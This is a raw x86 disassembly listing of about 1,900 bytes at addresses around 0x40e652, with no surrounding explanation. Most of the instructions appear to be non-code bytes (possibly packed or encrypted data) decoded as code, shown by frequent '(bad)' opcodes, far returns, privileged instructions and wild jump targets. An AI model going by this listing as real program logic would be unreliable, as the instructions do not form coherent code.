  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
